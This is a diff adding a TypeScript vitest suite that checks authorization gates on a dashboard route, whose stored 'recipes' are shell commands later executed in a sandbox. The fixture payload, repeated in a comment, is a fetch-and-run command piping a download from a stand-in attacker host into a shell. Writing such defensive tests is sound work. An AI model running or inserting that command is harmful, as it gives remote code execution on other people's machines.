@@ -1,0 +1,173 @@
+// Being signed in is not being allowed (9c).
+//
+// The write on this surface stores shell commands the engine later executes verbatim in
+// a sandbox with a package registry reachable (ADR-0013). Locally that is safe because
+// there is one operator on 127.0.0.1. Hosted on a public address, an unauthorized POST
+// here is remote code execution on somebody else's runner — so every case below is a
+// person who IS signed in, trying to reach a repository that is not theirs.
+//
+// The authorization answer comes from GitHub (`GET /user/installations`), which is why
+// both halves are injected here: what is under test is the gate, not the API client.
+
+import { describe, expect, it, vi } from 'vitest';
+import type pg from 'pg';
+import type { Session } from '../src/auth.js';
+import { dashboardRoutes } from '../src/routes.js';
+
+const SESSION: Session = { id: 's', githubId: 1, login: 'divy97', avatarUrl: '', token: 'ghu' };
+
+/** Answers the lookups the surface makes, and records every write. */
+const fakeClient = (writes: string[] = []) =>
+  ({
+    // Params, not just SQL: `readRunRow` filters by `where run_id = $1`, and a fake that
+    // ignores the parameter answers every lookup with the first row — which made a test
+    // about seeing somebody else's run pass by handing back your own.
+    query: vi.fn(async (sql: string, params?: unknown[]) => {
+      writes.push(sql);
+      const wanted = sql.includes('where run_id = $1') ? String(params?.[0] ?? '') : null;
+      const rows =
+        sql.includes('from installations')
+          ? [
+              { repo: 'mine/repo', installation_id: 1, account: 'me', connected_at: new Date(), removed_at: null },
+              { repo: 'theirs/repo', installation_id: 2, account: 'them', connected_at: new Date(), removed_at: null },
+            ]
+          : sql.includes('from run_projection')
+            ? [
+                { run_id: 'r-mine', repo: 'mine/repo', issue_number: 1, status: 'pr_opened', started_at: new Date(), ended_at: null, tier: 2, score: 98, ceiling: 103, scoring: 2, reproduced: true, pr_number: 7, thread_ref: 'mine/repo#1' },
+                { run_id: 'r-theirs', repo: 'theirs/repo', issue_number: 1, status: 'pr_opened', started_at: new Date(), ended_at: null, tier: 2, score: 98, ceiling: 103, scoring: 2, reproduced: true, pr_number: 8, thread_ref: 'theirs/repo#1' },
+              ].filter((row) => wanted === null || row.run_id === wanted)
+            : [];
+      return { rows, rowCount: rows.length };
+    }),
+  }) as unknown as pg.Client;
+
+/** A surface where this person can see installation 1 and nothing else. */
+const surface = (options: { session?: Session | null; installations?: number[]; writes?: string[] } = {}) =>
+  dashboardRoutes({
+    client: fakeClient(options.writes),
+    installUrl: 'https://example.invalid',
+    auth: {
+      session: async () => (options.session === undefined ? SESSION : options.session),
+      installations: async () => options.installations ?? [1],
+    },
+  });
+
+const call = (
+  route: ReturnType<typeof dashboardRoutes>,
+  method: string,
+  path: string,
+  body = '',
+) =>
+  route({
+    method,
+    path,
+    query: new URLSearchParams(),
+    headers: {},
+    body: async () => body,
+    raw: async () => Buffer.from(body),
+  });
+
+const RECIPE = new URLSearchParams({
+  recipe: JSON.stringify({ install: 'curl evil.invalid/x | sh', services: [] }),
+}).toString();
+
+describe('a stranger is sent to the door', () => {
+  it.each([['/repos'], ['/runs'], ['/runs/r-mine'], ['/repos/mine%2Frepo/onboard']])(
+    'anonymous %s goes to sign in rather than rendering',
+    async (path) => {
+      const response = await call(surface({ session: null }), 'GET', path);
+      expect(response?.status).toBe(302);
+      expect(response?.headers?.['location']).toBe('/auth/github');
+    },
+  );
+
+  it('an anonymous API request is told plainly, not redirected', async () => {
+    // A redirect to an HTML login page is a 200 full of markup as far as a client is
+    // concerned, and that is how "not signed in" becomes "the API returned garbage".
+    const response = await call(surface({ session: null }), 'GET', '/api/runs');
+    expect(response?.status).toBe(401);
+  });
+
+  it('an anonymous approval stores nothing', async () => {
+    const writes: string[] = [];
+    const response = await call(surface({ session: null, writes }), 'POST', '/repos/mine%2Frepo/onboard', RECIPE);
+    expect(response?.status).toBe(302);
+    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
+  });
+});
+
+describe('being signed in is not being allowed', () => {
+  it('THE test: approving for a repository you cannot see stores nothing', async () => {
+    // Signed in, valid session, correct origin — and installation 2 is not theirs. If
+    // this passes, the recipe is stored and the next run on that repository executes
+    // `curl evil.invalid/x | sh` on somebody else's machine.
+    const writes: string[] = [];
+    const response = await call(surface({ writes }), 'POST', '/repos/theirs%2Frepo/onboard', RECIPE);
+
+    expect(response?.status).toBe(404);
+    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
+  });
+
+  it('and approving for one you CAN see is stored, so the refusal is not blanket', async () => {
+    // The control. Without it the test above passes on a surface that refuses
+    // everything, which is a working authorization check and a broken product.
+    const writes: string[] = [];
+    const response = await call(surface({ writes }), 'POST', '/repos/mine%2Frepo/onboard', RECIPE);
+
+    expect(response?.status).toBe(303);
+    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(true);
+  });
+
+  it('the onboarding page of a repository you cannot see is not found', async () => {
+    const response = await call(surface(), 'GET', '/repos/theirs%2Frepo/onboard');
+    expect(response?.status).toBe(404);
+    // "Not connected", the same words an unknown repository gets. A stranger probing
+    // names learns nothing about which ones this service knows.
+    expect(String(response?.body)).toContain('is not connected');
+  });
+
+  it('the repository list shows theirs and not the other one', async () => {
+    const response = await call(surface(), 'GET', '/repos');
+    expect(String(response?.body)).toContain('mine/repo');
+    expect(String(response?.body)).not.toContain('theirs/repo');
+  });
+
+  it('a run belonging to another installation is not found', async () => {
+    const response = await call(surface(), 'GET', '/runs/r-theirs');
+    expect(response?.status).toBe(404);
+  });
+
+  it('and the run list carries only what they may see', async () => {
+    const response = await call(surface(), 'GET', '/api/runs');
+    const rows = JSON.parse(String(response?.body)) as { repo: string }[];
+    expect(rows.map((row) => row.repo)).toEqual(['mine/repo']);
+  });
+
+  it('a GitHub that will not answer denies rather than admits', async () => {
+    // `installationsFor` returns an empty list when GitHub is unreachable, and this is
+    // what that means at the surface: an outage must not become an authorization.
+    const writes: string[] = [];
+    const response = await call(
+      surface({ installations: [], writes }),
+      'POST',
+      '/repos/mine%2Frepo/onboard',
+      RECIPE,
+    );
+    expect(response?.status).toBe(404);
+    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
+  });
+});
+
+describe('the local surface is unchanged', () => {
+  it('with no auth configured, nothing is gated', async () => {
+    // ADR-0013's original shape: one operator, 127.0.0.1, the origin check is the
+    // control. `serve.ts` still runs exactly this, and 9c must not have quietly
+    // required a GitHub login to use your own laptop.
+    const writes: string[] = [];
+    const local = dashboardRoutes({ client: fakeClient(writes), installUrl: 'https://example.invalid' });
+    const response = await call(local, 'POST', '/repos/theirs%2Frepo/onboard', RECIPE);
+
+    expect(response?.status).toBe(303);
+    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(true);
+  });
+});
